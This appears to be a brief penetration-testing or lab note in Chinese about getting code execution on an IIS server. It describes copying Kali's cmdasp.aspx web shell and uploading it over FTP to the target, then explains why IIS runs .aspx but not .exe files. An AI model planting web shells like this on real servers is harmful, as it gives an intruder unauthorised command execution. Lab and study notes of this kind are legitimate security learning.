
一般有 IIS 表示權限應該都很大，塞一個 aspx reverse shell 檔案進去看看，因為是 IIS，所以開始丟 aspx 檔案，檔案在 kali 底下都有在    /usr/share/webshells/aspx

└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .  ，ftp> put cmdasp.aspx

IIS（Internet Information Services）本质上是一个 **Web 服务器**，默认只支持：

- `.aspx`
    
- `.ashx`
    
- `.asmx`
    
- `.php`（如果安装 PHP）
    
- `.cgi`、`.pl`（如果启用 CGI）
    
- `.html` 等静态文件
    

**并不会自动执行 .exe 文件**，因为：

1. IIS 默认不会让 Web 用户（如 IIS APPPOOL\DefaultAppPool）执行可执行文件
    
2. 出于安全原因，Web 目录没有执行权限
    
3. Handler Mappings 和 Request Restrictions 默认阻止 `.exe`
    
4. Windows 会阻止从 Web root 直接运行 EXE